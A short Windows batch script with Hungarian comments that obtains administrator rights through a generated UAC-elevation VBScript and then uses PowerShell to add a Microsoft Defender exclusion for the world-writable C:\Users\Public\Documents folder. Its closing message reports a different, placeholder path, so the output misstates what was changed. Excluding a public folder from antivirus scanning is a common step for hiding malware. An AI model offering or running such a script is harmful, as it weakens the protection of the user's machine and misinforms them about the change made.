@echo off
REM Ellenorzi es kerdezi a rendszergazdai jogosultsagot

NET SESSION >nul 2>&1
IF %ERRORLEVEL% EQU 0 (
    echo Rendszergazdai jogosultsagok megerositve. Folytatas...
    goto admin_folytatas
) ELSE (
    echo Rendszergazdai jogosultsagok kerese...
    goto ker_admin
)

:ker_admin
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    cscript //B "%temp%\getadmin.vbs"
    exit

:admin_folytatas
REM -----------------------------------------------------
REM IDE JOVENEK A FOFUNKCIO PARANCSAI

    POWERSHELL -InputFormat None -OutputFormat None -NonInteractive -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Documents'"

    echo Kizaras hozzaadva: C:\Path\To\Your\Folder

REM A FOFUNKCIO PARANCSAI VEGE
REM -----------------------------------------------------
pause
